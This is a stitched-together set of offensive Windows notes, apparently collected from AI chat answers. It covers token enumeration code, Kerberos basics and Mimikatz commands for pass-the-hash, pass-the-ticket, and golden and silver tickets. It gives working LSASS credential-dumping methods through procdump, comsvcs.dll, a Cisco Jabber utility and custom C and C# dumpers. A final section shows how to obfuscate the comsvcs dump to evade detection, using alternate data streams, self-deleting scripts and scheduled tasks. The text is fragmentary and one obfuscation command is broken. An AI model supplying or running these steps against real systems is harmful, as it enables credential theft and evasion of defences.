1. **Get the list of user sessions**: You can use the `Get-WmiObject` cmdlet to query Win32_Session and find user sessions.

2. **Identify tokens**: Once you have the sessions, you can identify the security tokens associated with these sessions. However, PowerShell doesn't have a direct cmdlet to enumerate tokens like `AccessToken` in C/C++ APIs, so this method focuses on identifying the processes and sessions which hold tokens.

Here is a PowerShell script that will give you a basic rundown of the sessions and their associated user names, which may help you track down delegation tokens:

```powershell
# Get all user sessions
$sessions = Get-WmiObject -Class Win32_Session

# Iterate over each session
foreach ($session in $sessions) {
    $user = $session.UserName
    $domain = $session.Domain
    $sessionId = $session.SessionId

    # Display session information
    Write-Host "Session ID: $sessionId"
    Write-Host "User: $domain\$user"

    # Get all processes in the session to check if they might have delegation tokens
    $processes = Get-Process | Where-Object { $_.SessionId -eq $sessionId }

    foreach ($process in $processes) {
        Write-Host "`tProcess: $($process.ProcessName) (PID: $($process.Id))"
    }

    Write-Host "`n"
}
```

### Method 2: Using `whoami /groups` for Specific Tokens
For a more targeted approach, you can use `whoami /groups` to see if the current user has certain privileges that would allow delegation (like the `SeDelegateSessionUserImpersonatePrivilege`).

```powershell
whoami /groups | Where-Object { $_ -match "SeDelegateSessionUserImpersonatePrivilege" }
```

This command will list the groups and privileges associated with the current user's token, and if the `SeDelegateSessionUserImpersonatePrivilege` is present, it means the user can create tokens that allow delegation.

### Further Token Examination:

If you need to dig deeper and programmatically examine delegation tokens, you would typically need to use C/C++ with Windows API functions like `OpenProcessToken`, `GetTokenInformation`, etc. PowerShell is limited in this regard for directly handling tokens beyond basic enumeration and privilege checks.

### Step 1: Install CSWin32 NuGet Package

First, ensure you have installed the `Microsoft.Windows.CsWin32` NuGet package:

```bash
dotnet add package Microsoft.Windows.CsWin32
```

### Step 2: Modify `NativeMethods.txt`

To generate the necessary P/Invoke signatures, include the following functions in your `NativeMethods.txt` file (you can find or create this file in the root of your project):

```plaintext
OpenProcessToken
GetTokenInformation
CloseHandle
LookupAccountSid
```

### Step 3: Write the C# Code

Now, you can write the C# code to enumerate processes and list tokens:

```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Windows.Sdk;

class Program
{
    static void Main(string[] args)
    {
        foreach (Process process in Process.GetProcesses())
        {
            SafeHandle hToken;
            if (PInvoke.OpenProcessToken(process.Handle, TOKEN_ACCESS_MASK.TOKEN_QUERY, out hToken))
            {
                try
                {
                    int tokenInfoLength = 0;
                    PInvoke.GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenUser, IntPtr.Zero, tokenInfoLength, out tokenInfoLength);
                    IntPtr tokenInfo = Marshal.AllocHGlobal(tokenInfoLength);

                    if (PInvoke.GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenUser, tokenInfo, tokenInfoLength, out tokenInfoLength))
                    {
                        var tokenUser = Marshal.PtrToStructure<TOKEN_USER>(tokenInfo);
                        IntPtr pSid = tokenUser.User.Sid;

                        uint cchName = 0;
                        uint cchReferencedDomainName = 0;
                        SID_NAME_USE sidUse;
                        PInvoke.LookupAccountSid(null, pSid, null, ref cchName, null, ref cchReferencedDomainName, out sidUse);

                        StringBuilder userName = new StringBuilder((int)cchName);
                        StringBuilder domainName = new StringBuilder((int)cchReferencedDomainName);

                        if (PInvoke.LookupAccountSid(null, pSid, userName, ref cchName, domainName, ref cchReferencedDomainName, out sidUse))
                        {
                            Console.WriteLine($"Process: {process.ProcessName}, User: {domainName}\\{userName}");
                        }
                        else
                        {
                            Console.WriteLine($"Process: {process.ProcessName}, User: (Unknown)");
                        }
                    }

                    Marshal.FreeHGlobal(tokenInfo);
                }
                finally
                {
                    hToken.Dispose();
                }
            }
            else
            {
                Console.WriteLine($"Process: {process.ProcessName}, Token could not be opened.");
            }
        }
    }
}
```


Certainly! Below is a C++ version of the code that lists tokens associated with processes. The code uses Windows API functions like `OpenProcessToken`, `GetTokenInformation`, and `LookupAccountSid` to achieve this.

### C++ Code Example: Listing Tokens Associated with Processes

```cpp
#include <iostream>
#include <windows.h>
#include <tlhelp32.h>
#include <sddl.h>

void PrintProcessTokenInfo(DWORD processID) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, processID);
    if (hProcess == NULL) {
        std::wcout << L"Could not open process: " << processID << L" (Error: " << GetLastError() << L")" << std::endl;
        return;
    }

    HANDLE hToken;
    if (OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
        DWORD tokenInfoLength = 0;
        GetTokenInformation(hToken, TokenUser, NULL, 0, &tokenInfoLength);
        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
            std::wcout << L"Could not retrieve token information (Error: " << GetLastError() << L")" << std::endl;
            CloseHandle(hProcess);
            CloseHandle(hToken);
            return;
        }

        TOKEN_USER* tokenUser = (TOKEN_USER*)malloc(tokenInfoLength);
        if (GetTokenInformation(hToken, TokenUser, tokenUser, tokenInfoLength, &tokenInfoLength)) {
            LPWSTR sidString;
            if (ConvertSidToStringSid(tokenUser->User.Sid, &sidString)) {
                std::wcout << L"Process ID: " << processID << L" SID: " << sidString << std::endl;

                WCHAR userName[256], domainName[256];
                DWORD userNameLen = sizeof(userName) / sizeof(WCHAR);
                DWORD domainNameLen = sizeof(domainName) / sizeof(WCHAR);
                SID_NAME_USE sidType;

                if (LookupAccountSid(NULL, tokenUser->User.Sid, userName, &userNameLen, domainName, &domainNameLen, &sidType)) {
                    std::wcout << L"User: " << domainName << L"\\" << userName << std::endl;
                } else {
                    std::wcout << L"LookupAccountSid failed (Error: " << GetLastError() << L")" << std::endl;
                }

                LocalFree(sidString);
            }
        } else {
            std::wcout << L"GetTokenInformation failed (Error: " << GetLastError() << L")" << std::endl;
        }

        free(tokenUser);
        CloseHandle(hToken);
    } else {
        std::wcout << L"OpenProcessToken failed (Error: " << GetLastError() << L")" << std::endl;
    }

    CloseHandle(hProcess);
}

int main() {
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        std::wcout << L"CreateToolhelp32Snapshot failed (Error: " << GetLastError() << L")" << std::endl;
        return 1;
    }

    if (Process32First(hProcessSnap, &pe32)) {
        do {
            PrintProcessTokenInfo(pe32.th32ProcessID);
        } while (Process32Next(hProcessSnap, &pe32));
    } else {
        std::wcout << L"Process32First failed (Error: " << GetLastError() << L")" << std::endl;
        CloseHandle(hProcessSnap);
        return 1;
    }

    CloseHandle(hProcessSnap);
    return 0;
}
```

### Explanation:

1. **CreateToolhelp32Snapshot and PROCESSENTRY32**:
   - `CreateToolhelp32Snapshot` captures a snapshot of the currently running processes. `PROCESSENTRY32` is used to iterate through these processes.

2. **OpenProcess**:
   - This function opens a handle to the process with `PROCESS_QUERY_INFORMATION` access, which is needed to query the process token.

3. **OpenProcessToken**:
   - Retrieves a handle to the access token associated with a process.

4. **GetTokenInformation**:
   - Retrieves information about the token, specifically the `TokenUser` structure, which contains the user's SID.

5. **LookupAccountSid**:
   - Converts the SID to a human-readable username and domain.

6. **Error Handling**:
   - The code checks for errors at various points to ensure that operations like token retrieval and SID lookup are successful. It reports errors using `GetLastError()`.

7. **Memory Management**:
   - Memory allocated with `malloc` for the `TOKEN_USER` structure is freed using `free`. Similarly, memory allocated by `ConvertSidToStringSid` is freed using `LocalFree`.


### Understanding Kerberos and Domain Credentials

**Kerberos** is a network authentication protocol used in Windows environments (among others) to authenticate users and services securely. It's the default authentication method used in Active Directory (AD) environments.

#### 1. **Kerberos Authentication Process**
   - **Step 1: AS-REQ (Authentication Service Request)**: When a user logs into a domain, their credentials (typically a hashed password) are used to request a Ticket Granting Ticket (TGT) from the Key Distribution Center (KDC), which is part of the domain controller.
   - **Step 2: AS-REP (Authentication Service Reply)**: The KDC checks the user’s credentials and, if correct, issues a TGT. This TGT is encrypted with the user's password hash and can only be decrypted by the user's session.
   - **Step 3: TGS-REQ (Ticket Granting Service Request)**: When the user wants to access a service, they use the TGT to request a Service Ticket (TGS) from the KDC.
   - **Step 4: TGS-REP (Ticket Granting Service Reply)**: The KDC issues a TGS, which the user can then present to the service they want to access.
   - **Step 5: Access Service**: The service decrypts the TGS using its own key and, if valid, allows the user to access the service.

#### 2. **Domain Credentials in Active Directory**
   - **User Credentials**: These are typically stored as NTLM (NT LAN Manager) hashes within AD and are used for authenticating users.
   - **Service Account Credentials**: Similar to user credentials but used by services running under specific accounts.
   - **Kerberos Tickets**: Temporary credentials that allow users to access network services without re-entering their password multiple times.

### Exploiting Kerberos and AD with Mimikatz

**Mimikatz** is a post-exploitation tool widely used by attackers to extract and exploit Windows credentials. It leverages weaknesses in the Windows authentication mechanisms, especially in the way Kerberos and domain credentials are managed.

#### Common Techniques Using Mimikatz

##### 1. **Pass-the-Hash (PtH) Attack**
   - **What It Is**: Allows an attacker to authenticate to a service using a captured NTLM hash instead of a plaintext password.
   - **How Mimikatz Does It**: Mimikatz can extract NTLM hashes from the LSASS (Local Security Authority Subsystem Service) process memory and use them to authenticate as the compromised user across the network.

   ```mimikatz
   sekurlsa::logonpasswords
   ```
   - After extracting the hash, the attacker can use the `sekurlsa::pth` command to launch a process with that hash, essentially impersonating the user:
   ```mimikatz
   sekurlsa::pth /user:Administrator /ntlm:<hash> /domain:<domain> /run:cmd.exe
   ```

##### 2. **Pass-the-Ticket (PtT) Attack**
   - **What It Is**: Allows an attacker to use a captured Kerberos ticket to authenticate to a service.
   - **How Mimikatz Does It**: Mimikatz can extract Kerberos tickets from memory, allowing the attacker to impersonate the ticket owner and gain access to resources.

   ```mimikatz
   kerberos::list /export
   ```
   - After exporting the ticket, it can be re-imported into another session:
   ```mimikatz
   kerberos::ptt <ticket.kirbi>
   ```

##### 3. **Golden Ticket Attack**
   - **What It Is**: A forged TGT that allows an attacker to impersonate any user, including domain admins, within the domain.
   - **How Mimikatz Does It**: To create a Golden Ticket, the attacker needs the NTLM hash of the `krbtgt` account, which is used to sign all Kerberos tickets. This hash can be obtained through other attacks (e.g., Pass-the-Hash). With this hash, Mimikatz can create a TGT valid for any user.

   ```mimikatz
   kerberos::golden /user:Administrator /domain:<domain> /sid:<domain SID> /krbtgt:<krbtgt hash> /id:500
   ```
   - Once the Golden Ticket is generated, it can be used to authenticate as any user within the domain, effectively giving the attacker full control over the environment.

##### 4. **Silver Ticket Attack**
   - **What It Is**: A forged service ticket (TGS) that allows the attacker to access specific services within a domain without needing to communicate with the KDC.
   - **How Mimikatz Does It**: By obtaining the NTLM hash of a service account (like `HTTP`, `CIFS`, etc.), Mimikatz can forge a service ticket that grants access to that specific service.

   ```mimikatz
   kerberos::golden /domain:<domain> /sid:<domain SID> /target:<target service> /rc4:<service account hash> /user:<username> /service:<service name> /sid:<user sid>
   ```

##### 5. **Over-Pass-the-Hash (Pass-the-Key)**
   - **What It Is**: Similar to Pass-the-Hash, but uses Kerberos keys (e.g., AES keys) instead of NTLM hashes.
   - **How Mimikatz Does It**: Mimikatz can extract and use these Kerberos keys to authenticate without needing the password or NTLM hash.

   ```mimikatz
   sekurlsa::pth /user:<username> /aes256:<aes256 key> /domain:<domain> /run:cmd.exe
   ```

### How Misconfigurations and Privileges Are Exploited

#### 1. **Excessive Privileges**
   - Users or services with excessive privileges can lead to the exposure of sensitive credentials, like the `krbtgt` hash, enabling attacks like Golden Ticket.

#### 2. **Weak Password Policies**
   - Weak or reused passwords can be easily cracked, allowing attackers to gain hashes that can be used in Pass-the-Hash or Pass-the-Ticket attacks.

#### 3. **Credential Caching**
   - Windows caches credentials in memory (LSASS), which can be extracted by tools like Mimikatz. Disabling or restricting the ability to dump LSASS can mitigate this.

#### 4. **Misconfigured Service Accounts**
   - Service accounts with weak passwords or inappropriate privileges can be targeted to forge Silver Tickets or gain initial footholds in a network.


## Processing Credentials Offline

Dumping the LSASS (Local Security Authority Subsystem Service) process memory is a common technique used to extract credentials from a Windows system. The dumped memory can then be analyzed offline using tools like Mimikatz to extract sensitive information, such as passwords, hashes, and Kerberos tickets.

### **Method 1: Using Mimikatz to Dump LSASS**

1. **Dump LSASS Memory Directly with Mimikatz**:
   - You can use Mimikatz to directly dump the LSASS process memory while running on the target machine.

   ```cmd
   mimikatz # sekurlsa::minidump lsass.dmp
   mimikatz # sekurlsa::logonpasswords
   ```

2. **Dump LSASS to a File for Offline Analysis**:
   - Use the `sekurlsa::minidump` command to load the dump file into Mimikatz for offline analysis.

   ```cmd
   mimikatz # sekurlsa::minidump lsass.dmp
   mimikatz # sekurlsa::logonpasswords
   ```

   Here, `lsass.dmp` is the memory dump file created by a different method.

### **Method 2: Using Task Manager, Procdump, or Sysinternals**

1. **Using Task Manager**:
   - **Note**: This method is less stealthy and often requires administrative privileges.
   - Open Task Manager (`Ctrl + Shift + Esc`).
   - Go to the `Details` tab.
   - Find `lsass.exe`, right-click, and select `Create dump file`.
   - The dump will be saved in a temporary directory (e.g., `C:\Users\<User>\AppData\Local\Temp\lsass.dmp`).

2. **Using Sysinternals ProcDump**:
   - ProcDump is a command-line tool from Sysinternals that allows you to dump the memory of a process, including LSASS.

   ```cmd
   procdump -accepteula -ma lsass.exe lsass.dmp
   ```

   - The above command dumps the memory of `lsass.exe` into a file named `lsass.dmp` for offline analysis.

3. **Using `comsvcs.dll` for Stealthier Dumping**:
   - This method uses `comsvcs.dll` to create a memory dump of the `lsass.exe` process in a stealthier manner.

   ```cmd
   rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 1234 C:\path\to\dumpfile.dmp full
   ```

   Replace `1234` with the process ID (PID) of `lsass.exe`. You can find the PID by running `tasklist | findstr lsass`.

### ProcessDump.exe from Cisco Jabber

Sometimes Cisco Jabber (always?) comes with a nice utility called `ProcessDump.exe` that can be found in `c:\program files (x86)\cisco systems\cisco jabber\x64\`. We can use it to dump lsass process memory in Powershell like so:
```cmd
cd c:\program files (x86)\cisco systems\cisco jabber\x64\
processdump.exe (ps lsass).id c:\temp\lsass.dmp
```

### **Method 3: Dumping LSASS with a Custom C/C# Program**

#### C Program Example

Here is a simple C program that uses the Windows API to dump the LSASS process memory:

```c
#include <windows.h>
#include <dbghelp.h>
#include <tlhelp32.h>

DWORD FindProcessId(const char *processName) {
    PROCESSENTRY32 processInfo;
    processInfo.dwSize = sizeof(processInfo);
    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;

    Process32First(processesSnapshot, &processInfo);
    if (!strcmp(processInfo.szExeFile, processName)) {
        CloseHandle(processesSnapshot);
        return processInfo.th32ProcessID;
    }

    while (Process32Next(processesSnapshot, &processInfo)) {
        if (!strcmp(processInfo.szExeFile, processName)) {
            CloseHandle(processesSnapshot);
            return processInfo.th32ProcessID;
        }
    }

    CloseHandle(processesSnapshot);
    return 0;
}

int main() {
    DWORD processId = FindProcessId("lsass.exe");
    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);

    HANDLE dumpFile = CreateFile("C:\\Windows\\Temp\\lsass.dmp", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (processHandle && dumpFile) {
        MiniDumpWriteDump(processHandle, processId, dumpFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
        CloseHandle(dumpFile);
        CloseHandle(processHandle);
    }

    return 0;
}
```

- **Explanation**:
  - This C code locates the `lsass.exe` process by its name, opens it, and creates a memory dump file using `MiniDumpWriteDump`.
  - The dump file (`lsass.dmp`) can be analyzed later with Mimikatz.

#### C# Program Example

Here’s a similar approach using C#:

```csharp
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("Dbghelp.dll")]
    public static extern bool MiniDumpWriteDump(
        IntPtr hProcess,
        uint ProcessId,
        IntPtr hFile,
        MINIDUMP_TYPE DumpType,
        IntPtr ExceptionParam,
        IntPtr UserStreamParam,
        IntPtr CallbackParam);

    public enum MINIDUMP_TYPE : uint
    {
        MiniDumpWithFullMemory = 0x00000002
    }

    static void Main(string[] args)
    {
        Process[] processes = Process.GetProcessesByName("lsass");
        if (processes.Length > 0)
        {
            Process lsass = processes[0];
            string dumpFile = Path.Combine("C:\\Windows\\Temp", "lsass.dmp");

            using (FileStream fs = new FileStream(dumpFile, FileMode.Create, FileAccess.Write, FileShare.None))
            {
                bool success = MiniDumpWriteDump(lsass.Handle, (uint)lsass.Id, fs.SafeFileHandle.DangerousGetHandle(), MINIDUMP_TYPE.MiniDumpWithFullMemory, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
                Console.WriteLine(success ? "Dump successful" : "Dump failed");
            }
        }
    }
}
```

- **Explanation**:
  - This C# code works similarly to the C example, locating `lsass.exe` and dumping its memory using `MiniDumpWriteDump`.

### **Reading the Dump Offline with Mimikatz**

Once you have the `lsass.dmp` file, you can analyze it offline using Mimikatz to extract credentials:

1. **Load the Dump into Mimikatz**:

   ```cmd
   mimikatz # sekurlsa::minidump lsass.dmp
   ```

2. **Extract Credentials**:

   ```cmd
   mimikatz # sekurlsa::logonpasswords
   ```

This command will list the credentials stored in the memory dump, including plaintext passwords, NTLM hashes, and Kerberos tickets.

### **Security Considerations**

Dumping the LSASS process is a powerful but risky operation, as it can trigger security alerts (e.g., from Windows Defender or third-party AV software) and may require administrative privileges. It's important to secure your systems against such attacks by using measures like Credential Guard, disabling unnecessary admin rights, and monitoring for suspicious activity.

Certainly! You can use the CsWin32 library to generate P/Invoke signatures instead of manually writing the `DllImport` attributes. CsWin32 can automatically generate these interop signatures based on Windows API metadata.

Below is the C# code rewritten to use CsWin32 for calling the `MiniDumpWriteDump` function:

### **1. Install CsWin32:**
First, you'll need to install CsWin32 via NuGet:

```bash
dotnet add package Microsoft.Windows.CsWin32
```

### **2. Generate the P/Invoke Signature:**
Add a `NativeMethods.txt` file to your project and include the following line in it:

```
MiniDumpWriteDump
```

This tells CsWin32 to generate the P/Invoke signature for the `MiniDumpWriteDump` function.

### **3. Use the Generated Code:**

After adding the `NativeMethods.txt`, CsWin32 will generate the necessary P/Invoke code. You can then use this generated code in your C# program. Here’s the complete C# program with CsWin32:

```csharp
using System;
using System.Diagnostics;
using System.IO;
using Microsoft.Windows.Sdk;

class Program
{
    static void Main(string[] args)
    {
        Process[] processes = Process.GetProcessesByName("lsass");
        if (processes.Length > 0)
        {
            Process lsass = processes[0];
            string dumpFile = Path.Combine("C:\\Windows\\Temp", "lsass.dmp");

            using (FileStream fs = new FileStream(dumpFile, FileMode.Create, FileAccess.Write, FileShare.None))
            {
                bool success = PInvoke.MiniDumpWriteDump(
                    lsass.Handle,
                    (uint)lsass.Id,
                    fs.SafeFileHandle.DangerousGetHandle(),
                    MINIDUMP_TYPE.MiniDumpWithFullMemory,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    IntPtr.Zero);

                Console.WriteLine(success ? "Dump successful" : "Dump failed");
            }
        }
    }
}
```

### **Explanation**:

1. **Using CsWin32**:
   - `CsWin32` generates the `PInvoke.MiniDumpWriteDump` method based on the function definition from Windows API metadata.
   - The generated `PInvoke` class contains the method signature for `MiniDumpWriteDump`.

2. **The Main Code**:
   - The code locates the `lsass.exe` process and dumps its memory using the `MiniDumpWriteDump` function, similar to the earlier example.
   - Instead of using a manually defined `DllImport`, the code uses the generated `PInvoke.MiniDumpWriteDump` method provided by CsWin32.

### **Advantages of Using CsWin32**:

- **Automatic Updates**: The P/Invoke signatures are automatically generated and updated based on the latest Windows SDK, reducing the risk of errors.
- **Type Safety**: CsWin32 provides better type safety and usability compared to manually writing `DllImport` signatures.

This approach simplifies the integration of Windows API calls into your C# code by leveraging the power of CsWin32 for automatic interop code generation.

### Comsvcs.dll

Dumping the LSASS process using `comsvcs.dll` can be detected by security tools, so attackers may employ various obfuscation techniques to avoid detection. Below are some obfuscation strategies that can be applied when using `comsvcs.dll` to dump LSASS memory:

### 1. **Command Line Obfuscation**
   - **String Concatenation**: Break the command into multiple parts and concatenate them. This can make the command less recognizable by signature-based detection tools.

     ```cmd
     cmd.exe /c "rundll32.exe c:\\wi"+"ndo"+"ws\\syst"+"em32\\comsvcs.dll, MiniDump 1234 C:\\\\Win"+"do"+"ws\\Temp\\lsass.dmp full"
     ```

   - **Environment Variables**: Use environment variables to obfuscate parts of the path.

     ```cmd
     set sysdir=%SystemRoot%\system32
     rundll32.exe %sysdir%\comsvcs.dll, MiniDump 1234 %SystemRoot%\Temp\lsass.dmp full
     ```

   - **Alternate Data Streams (ADS)**: Hide the command in an alternate data stream of a file and execute it.

     ```cmd
     echo rundll32.exe c:\windows\system32\comsvcs.dll, MiniDump 1234 c:\windows\temp\lsass.dmp full > normal.txt:hidden
     more < normal.txt:hidden | cmd
     ```

### 2. **Fileless Techniques**
   - **Memory-only Execution**: Instead of writing the dump to a file, the dump can be held in memory and transmitted or processed without touching the disk.

   - **In-Memory Assembly Loading**: Load the `comsvcs.dll` and execute the dump operation directly in memory using a script or a tool that supports reflective DLL loading. This avoids writing `comsvcs.dll` to disk.

### 3. **Using Alternate DLLs**
   - **Custom DLL Loading**: If allowed, you could rename `comsvcs.dll` or use another DLL that performs a similar function, reducing the chance that a specific signature will match.

   - **Hijack DLL Path**: Modify the DLL search order to load a modified version of `comsvcs.dll` that performs the same operation but with added obfuscation.

### 4. **Staging the Command in Chunks**
   - **Execution in Stages**: Break down the execution process into multiple stages to avoid detection by heuristic-based systems.

     ```cmd
     set dumpcmd=rundll32.exe
     set dllpath=c:\windows\system32\comsvcs.dll, MiniDump
     set pid=1234
     set output=c:\windows\temp\lsass.dmp
     %dumpcmd% %dllpath% %pid% %output% full
     ```

### 5. **Encoding and Decoding**
   - **Base64 Encoding**: Encode the command in Base64 and decode it on the fly before execution.

     ```cmd
     powershell -encodedCommand <Base64String>
     ```

   - **XOR Obfuscation**: Use XOR or another simple encoding mechanism to obfuscate the command and then decode it at runtime.

### 6. **Indirect Command Execution**
   - **Parent-Child Process Spoofing**: Execute the dump command from a less suspicious parent process or chain it through other benign processes to mask the true intent.

     ```cmd
     powershell -c "Start-Process rundll32.exe -ArgumentList 'c:\windows\system32\comsvcs.dll, MiniDump 1234 c:\windows\temp\lsass.dmp full'"
     ```

### 7. **Using a Wrapper Script or Binary**
   - **Wrapper Script**: Write a script or small binary that obfuscates the actual dump command by hiding it in complex logic or disguising it as a legitimate task.

   - **Self-deleting Script**: Create a script that runs the dump command and then deletes itself to remove traces.

     ```cmd
     echo rundll32.exe c:\windows\system32\comsvcs.dll, MiniDump 1234 c:\windows\temp\lsass.dmp full > temp.bat
     temp.bat & del temp.bat
     ```

### 8. **Time-delayed Execution**
   - **Scheduled Tasks**: Use a scheduled task to delay the execution, which might bypass real-time monitoring tools.

     ```cmd
     schtasks /create /tn "DumpLSASS" /tr "rundll32.exe c:\windows\system32\comsvcs.dll, MiniDump 1234 c:\windows\temp\lsass.dmp full" /sc once /st 23:59
     ```

   - **Sleep Functions**: Introduce a sleep or delay before executing the dump command to reduce the likelihood of detection by security software.

     ```cmd
     timeout /t 30 /nobreak >nul & rundll32.exe c:\windows\system32\comsvcs.dll, MiniDump 1234 c:\windows\temp\lsass.dmp full
     ```
